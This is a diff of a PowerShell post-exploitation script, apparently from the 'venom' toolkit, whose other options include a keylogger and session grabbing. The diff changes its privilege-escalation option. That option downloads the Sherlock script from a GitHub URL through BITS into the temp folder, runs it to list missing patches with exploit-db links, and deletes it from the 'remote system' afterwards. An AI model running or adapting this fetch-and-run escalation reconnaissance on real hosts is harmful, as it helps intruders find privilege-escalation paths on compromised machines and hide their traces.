@@ -112,8 +112,12 @@
    completing is task (Download file) it exits execution.
 
 .EXAMPLE
-   PS C:\> .\webserver.ps1 -EOP True
+   PS C:\> .\webserver.ps1 -EOP CVE
    Find missing software patches for local privilege escalation.
+   
+   PS C:\> .\webserver.ps1 -EOP ALL
+   Find missing software patches for local privilege escalation
+   and list all KB's security patchs installed onscreen
 
    Title      : TrackPopupMenu Win32k Null Point Dereference
    MSBulletin : MS14-058
@@ -369,7 +373,7 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
 }
 
 
-If($EOP -ne "False"){
+If(-not($EOP -eq "False")){
 If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'False' -or $Keylogger -ne 'False'){
    write-host "[warning] -EOP parameter can not be used together with other parameters .." -ForeGroundColor Yellow
    Start-Sleep -Seconds 1
@@ -377,22 +381,31 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
 
    <#
    .SYNOPSIS
-      Author: @_RastaMouse|@r00t-3xp10it (sherlock.ps1 v2)
+      Author: @_RastaMouse|@r00t-3xp10it (sherlock.ps1 v1.2)
       Find missing software patchs for privilege escalation
 
    .NOTES
       This Module does not exploit any vulnerabitys found.
-      It will 'report' them and presents the exploit-db link
+      It will 'report' and present the POC exploit-db link
 
    .EXAMPLE
-      PS C:\> .\webserver.ps1 -EOP True
-      Find missing software patchs for privilege escalation
+      PS C:\> .\webserver.ps1 -EOP CVE
+      Find missing software patches for local privilege escalation.
+   
+      PS C:\> .\webserver.ps1 -EOP ALL
+      Find missing software patches for local privilege escalation
+      and list all KB's security patchs installed onscreen
+
+      Title      : TrackPopupMenu Win32k Null Point Dereference
+      MSBulletin : MS14-058
+      CVEID      : 2014-4113
+      Link       : https://www.exploit-db.com/exploits/35101/
+      VulnStatus : Appers Vulnerable
    #>
 
    ## Download Sherlock (@_RastaMouse) from my github repository
-   # Remark: I add to port sherlock to my Git-Hub to be abble to fix
-   # the cmdlet 'ObjectNotFound' error display when the file its not
-   # found, And to update the cmdlet (deprecated) with new 2020 EOP CVE's
+   # Remark: I add to port sherlock to my Git-Hub to be abble to fix the cmdlet 'ObjectNotFound' error display
+   # when the file its not found, And to update the cmdlet (deprecated) with new 2020 EOP CVE's entrys
    ## Downloads sherlock.ps1 to disk using BitsTransfer service (BITS)
    Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/aux/sherlock.ps1 -Destination $Env:TMP\sherlock.ps1 -ErrorAction SilentlyContinue|Out-Null
  
@@ -413,9 +426,11 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
       Write-Host "Find missing software patchs for privilege escalation"
       Write-Host "-----------------------------------------------------"
       Import-Module -Name "$Env:TMP\sherlock.ps1" -Force
-      Find-AllVulns
+      ## 'Get-HotFixs' function is only available using -EOP <ALL>
+      If($EOP -eq "ALL"){Get-HotFixs;Find-AllVulns}Else{Find-AllVulns}
    }
-   ## Delete sherlock script if NOT used the FileLess technic
+
+   ## Delete sherlock script on remote system
    If(Test-Path -Path "$Env:TMP\sherlock.ps1"){Remove-Item -Path "$Env:TMP\sherlock.ps1" -Force}
    Write-Host "";exit ## exit @webserver
 }
